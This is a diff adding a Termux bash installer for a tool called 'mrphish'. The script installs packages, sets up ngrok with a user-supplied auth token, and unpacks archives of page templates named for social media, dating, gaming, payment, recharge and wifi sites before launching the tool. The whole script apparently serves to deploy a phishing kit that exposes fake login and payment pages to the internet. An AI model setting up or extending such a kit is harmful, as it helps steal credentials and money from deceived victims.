@@ -1,0 +1,131 @@
+#basic packages install
+#only one time install request pkgs
+#make sure you have internet with speed
+apt-get update -y
+apt-get upgrade -y
+termux-setup-storage
+pkg install git -y
+pkg install zip -y
+pkg install mpv -y
+pkg install wget -y
+pkg install openssh -y
+pkg install python -y
+pkg install python2 -y
+pkg install nano -y
+pkg install php -y
+pip install lolcat 
+cd /sdcard
+mkdir dUmpS
+cd $HOME/mrphish
+mv log.mp3 /sdcard
+cd $HOME/mrphish
+chmod +x ngrok
+mv ngrok $HOME
+cd $HOME
+clear
+echo -e '\e[96m          [\e[92mNGROK SETUP\e[96m]--------------'
+echo -e '\e[96m                           |'
+echo -e '\e[92m    NGROK IS NOT WORKING WITH WIFI USERS BUT DONT WORRY'
+echo -e '\e[92m    JUST PASTE AUTH CODE BY WATCHING VIDEO THEN YOU CAN'
+echo -e '\e[92m        USE NGROK WITHOUT ANY ISSUE, GET LINK BELOW'
+echo
+echo -e '\e[92m      VIDEO LINK :- [ https://youtu.be/c0fV8liYbcE ]'
+echo
+echo -e '\e[96m   EXAMPLE AUTH CODE - ./ngrok authtoken KavOb3e638hhs9 '
+echo -e '\e[96m                           |'
+echo -e '\e[96m        JUST PASTE THIS PART - KavOb3e638hhs973ijsiwu'
+echo -e '\e[96m                           |'
+echo -e '\e[96m                           |'
+read -p $'\n\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] NGROK AUTH CODE : \e[0m' name
+./ngrok authtoken $name
+clear 
+mv ngrok $HOME/mrphish/core
+cd $HOME/mrphish
+cd core/deploys
+unzip dating.zip
+unzip gaming.zip
+unzip others.zip
+unzip others1.zip
+unzip socialmedia.zip
+unzip socialmedia1.zip
+unzip socialmedia2.zip
+unzip socialmedia3.zip
+unzip socialmedia4.zip
+unzip socialmedia5.zip
+unzip socialmedia6.zip
+unzip socialmedia7.zip
+unzip socialmedia8.zip
+unzip socialmedia9.zip
+unzip socialmedia10.zip
+unzip socialmedia11.zip
+unzip socialmedia12.zip
+unzip payment.zip
+unzip recharge.zip                                                                      
+unzip wifirt.zip                                                                        
+cd socialmedia1
+mv * $HOME/mrphish/core/deploys/socialmedia
+cd $HOME/mrphish/core/deploys
+rm -rf socialmedia1
+cd $HOME/mrphish/core/deploys
+cd socialmedia2
+mv * $HOME/mrphish/core/deploys/socialmedia
+cd $HOME/mrphish/core/deploys
+rm -rf socialmedia2
+cd $HOME/mrphish/core/deploys
+cd socialmedia3
+mv * $HOME/mrphish/core/deploys/socialmedia
+cd $HOME/mrphish/core/deploys
+rm -rf socialmedia3
+cd $HOME/mrphish/core/deploys
+cd socialmedia4
+mv * $HOME/mrphish/core/deploys/socialmedia
+cd $HOME/mrphish/core/deploys
+rm -rf socialmedia4
+cd $HOME/mrphish/core/deploys
+cd socialmedia5
+mv * $HOME/mrphish/core/deploys/socialmedia
+cd $HOME/mrphish/core/deploys
+rm -rf socialmedia5
+cd $HOME/mrphish/core/deploys
+cd socialmedia6
+mv * $HOME/mrphish/core/deploys/socialmedia
+cd $HOME//new/mrphish/core/deploys
+rm -rf socialmedia6
+cd $HOME/mrphish/core/deploys
+cd socialmedia7
+mv * $HOME/mrphish/core/deploys/socialmedia
+cd $HOME/mrphish/core/deploys
+rm -rf socialmedia7
+cd $HOME/mrphish/core/deploys
+cd socialmedia8
+mv * $HOME/mrphish/core/deploys/socialmedia
+cd $HOME/mrphish/core/deploys
+rm -rf socialmedia8
+cd $HOME/mrphish/core/deploys
+cd socialmedia9
+mv * $HOME/mrphish/core/deploys/socialmedia
+cd $HOME/mrphish/core/deploys
+rm -rf socialmedia9
+cd $HOME/mrphish/core/deploys
+cd socialmedia10
+mv * $HOME/mrphish/core/deploys/socialmedia
+cd $HOME/mrphish/core/deploys
+rm -rf socialmedia10
+cd $HOME/mrphish/core/deploys
+cd socialmedia11
+mv * $HOME/mrphish/core/deploys/socialmedia
+cd $HOME/mrphish/core/deploys
+rm -rf socialmedia11
+cd $HOME/mrphish/core/deploys
+cd socialmedia12
+mv * $HOME/mrphish/core/deploys/socialmedia
+cd $HOME/mrphish/core/deploys
+rm -rf socialmedia12
+cd others1
+mv  * $HOME/mrphish/core/deploys/others
+cd $HOME/mrphish/core/deploys
+rm -rf others1
+rm *.zip
+cd $HOME/mrphish
+rm setup
+bash mrphish
